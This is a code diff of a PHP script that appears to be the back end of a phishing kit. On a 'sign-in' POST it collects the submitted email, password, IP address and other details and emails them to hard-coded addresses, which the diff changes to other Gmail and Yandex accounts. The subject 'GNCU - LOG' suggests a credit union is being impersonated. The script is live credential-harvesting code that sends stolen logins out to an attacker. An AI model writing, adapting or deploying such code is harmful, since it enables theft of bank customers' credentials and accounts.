@@ -9,11 +9,8 @@ function sanitize($value) {
 }
 
 
-// $EMAIL = "gottmacht.empire@gmail.com";
-// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
-
-$EMAIL = "jacedev151@gmail.com";
-$SENDER_EMAIL = "jacetech151@gmail.com";
+$EMAIL = "gottmacht.empire@gmail.com";
+$SENDER_EMAIL = "gottmacht.empire@yandex.com";
 
 function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
@@ -111,7 +108,7 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
 if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["email"]);
     $password = sanitize($_POST["password"]);
-    $ip = json_encode(json_decode(sanitize($_POST["ip"]), true), JSON_PRETTY_PRINT);
+    $ip = sanitize($_POST["ip"]);
     $detail = sanitize($_POST["detail"]);
 
     sendEmail(["username" => $username, "ip" => $ip, "password" => $password, "detail" => $detail]);
